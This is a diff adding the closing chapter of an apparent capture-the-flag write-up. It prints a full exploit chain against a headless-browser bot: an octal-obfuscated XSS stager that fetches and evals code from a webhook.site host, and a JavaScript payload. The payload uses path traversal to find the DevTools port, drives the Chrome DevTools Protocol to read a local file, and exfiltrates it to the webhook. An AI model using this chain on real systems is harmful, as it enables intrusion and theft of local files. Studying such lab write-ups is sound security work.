@@ -649,3 +649,121 @@ Looking at the output back at our hook, we see that the attaching occurred but w
 }
 ```
 
+Let's simplify things and just connect to a page-context CDP socket instead. We can do that by connecting to `/devtools/page/<targetId>` instead of the `/devtools/browser` endpoint.
+
+## Chapter 5: Finale
+We experimented with CDP and built a convincing exploit path.
+
+Let's put everything together.
+
+First, we have our XSS stager, crafted and sent through this Python script:
+```python
+import httpx
+from urllib.parse import quote
+
+url = 'http://localhost'
+#url = 'https://hackthebot2-361ce3873f4d6b2b.deploy.phreaks.fr'
+
+def get_payload():
+    payload = '''
+const hook = 'http://webhook.site/<id>/'
+fetch(hook).then(r => r.text()).then(text => eval(text))
+'''.encode()
+
+    payload = f"<input oncontentvisibilityautostatechange='eval(\"{'\\' + '\\'.join([oct(i)[2:] for i in payload])}\")' style=content-visibility:auto>"
+
+    return quote(payload)
+
+payload = get_payload()
+report_link = 'http://localhost' + '?q=' + payload
+
+r = httpx.post(f'{url}/report', data={'url': report_link})
+log_file = r.text.strip()
+print(log_file)
+
+r = httpx.get(f'{url}/{log_file}')
+print(r.text)
+```
+
+Then, in our staged JS payload (served from hook), we will do the following:
+1. Use path traversal to grab CDP browser endpoint.
+2. Connect to CDP browser endpoint via web sockets.
+3. Use `Target.getTargets` to get the targetId of a blank page (we don't want to disrupt our current "master" page).
+4. Connect to CDP page endpoint via web sockets.
+5. Use the now-available `Page.navigate` to navigate to local `file:///root/flag2.txt`.
+6. Read the page's content using `Runtime.evaluate`, just as we would in a local devtools console.
+
+Let's illustrate that in code:
+```js
+(async () => {
+    try {
+        const r = await fetch(
+            "http://localhost/logs../browser_cache/DevToolsActivePort"
+        ).then((r) => r.text());
+        let [port, path] = r.split("\n");
+        const devTools = `http://localhost:${port}${path}`;
+        const ws = new WebSocket(devTools);
+
+        function exfil(data) {
+            fetch(hook + "message", { method: "POST", body: data });
+        }
+
+        ws.onopen = () => {
+            ws.send(
+                JSON.stringify({
+                    id: 1,
+                    method: "Target.getTargets",
+                })
+            );
+        };
+
+        ws.onmessage = (event) => {
+            let data = JSON.parse(event.data);
+
+            const targetId = data.result.targetInfos[1].targetId;
+            exfil(targetId);
+
+			// open new socket in page context
+            const ws = new WebSocket(
+                `http://localhost:${port}/devtools/page/${targetId}`
+            );
+
+			// navigate to flag
+            ws.onopen = () => {
+                ws.send(
+                    JSON.stringify({
+                        id: 1,
+                        method: "Page.navigate",
+                        params: { url: "file:///root/flag2.txt" },
+                    })
+                );
+
+				// wait for flag to load before checking the page's content
+                setTimeout(() => {
+                    ws.send(
+                        JSON.stringify({
+                            id: 2,
+                            method: "Runtime.evaluate",
+                            params: {
+                                expression:
+                                    "document.documentElement.innerHTML",
+                            },
+                        })
+                    );
+                }, 1000);
+            };
+
+			// exfiltrate the output of 2nd request
+            ws.onmessage = (event) => {
+                if (JSON.parse(event.data).id === 2) exfil(event.data);
+            };
+        };
+
+	// guard rail to report any errors back to us
+    } catch (e) {
+        exfil(e.stack);
+    }
+})();
+```
+
+And that's pretty much it yet!
